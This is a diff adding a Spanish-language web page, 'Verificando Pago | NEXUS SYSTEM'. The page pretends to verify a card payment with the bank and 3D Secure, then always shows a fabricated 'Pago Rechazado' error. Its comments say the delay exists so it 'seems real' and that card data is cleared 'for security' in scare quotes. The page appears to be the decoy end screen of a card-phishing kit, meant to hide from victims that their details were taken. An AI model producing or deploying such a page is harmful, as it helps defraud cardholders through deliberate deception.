@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificando Pago | NEXUS SYSTEM</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #060606;
+            --accent: #6772e5;
+            --error: #ff4b4b;
+            --text-main: #ffffff;
+            --text-dim: #a0a0a0;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Outfit', sans-serif; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            text-align: center;
+        }
+
+        .container { padding: 30px; width: 100%; max-width: 400px; }
+
+        /* Spinner Animado */
+        .loader-wrapper { position: relative; width: 100px; height: 100px; margin: 0 auto 30px; }
+        
+        .spinner {
+            width: 100%; height: 100%;
+            border: 4px solid rgba(255,255,255,0.05);
+            border-top: 4px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .card-logo-icon {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2rem; opacity: 0; transition: 0.5s;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        h2 { font-weight: 800; font-size: 1.5rem; margin-bottom: 10px; }
+        p { color: var(--text-dim); font-size: 0.9rem; line-height: 1.5; }
+
+        /* Estado de Error */
+        .status-icon-error {
+            display: none; font-size: 4rem; color: var(--error);
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+
+        .btn-retry {
+            display: none; margin-top: 30px; background: white; color: black;
+            padding: 15px 30px; border-radius: 12px; text-decoration: none;
+            font-weight: 900; font-size: 0.8rem; text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="loading-ui">
+            <div class="loader-wrapper">
+                <div class="spinner"></div>
+                <i id="dynamic-logo" class="fab fa-cc-visa card-logo-icon"></i>
+            </div>
+            <h2 id="status-title">Verificando transacción...</h2>
+            <p id="status-desc">Estamos comunicándonos con tu entidad bancaria para autorizar el pago. No cierres esta ventana.</p>
+        </div>
+
+        <div id="error-ui" style="display: none;">
+            <i class="fas fa-times-circle status-icon-error" id="error-icon" style="display: block;"></i>
+            <h2 style="margin-top: 20px;">Pago Rechazado</h2>
+            <p>Lo sentimos, la transacción no pudo ser procesada por el emisor de la tarjeta (Código: 05 - Fondos Insuficientes o Denegado).</p>
+            <a href="index.html" class="btn-retry" id="btn-back" style="display: inline-block;">Volver al inicio</a>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const cardType = localStorage.getItem('card_type') || 'visa';
+            const logo = document.getElementById('dynamic-logo');
+            
+            // Ajustar logo según tarjeta
+            if(cardType === 'mastercard') {
+                logo.className = 'fab fa-cc-mastercard card-logo-icon';
+                document.documentElement.style.setProperty('--accent', '#ff5f00'); // Color naranja MC
+            } else {
+                logo.className = 'fab fa-cc-visa card-logo-icon';
+            }
+            
+            logo.style.opacity = '1';
+
+            // Simulación de verificación profesional
+            setTimeout(() => {
+                document.getElementById('status-title').innerText = "Validando protocolos 3D Secure...";
+            }, 2500);
+
+            setTimeout(() => {
+                // Ocultar carga y mostrar error
+                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('error-ui').style.display = 'block';
+                
+                // Borrar datos sensibles por "seguridad"
+                localStorage.removeItem('card_type');
+            }, 6000); // 6 segundos de espera para que parezca real
+        }
+    </script>
+</body>
+</html>
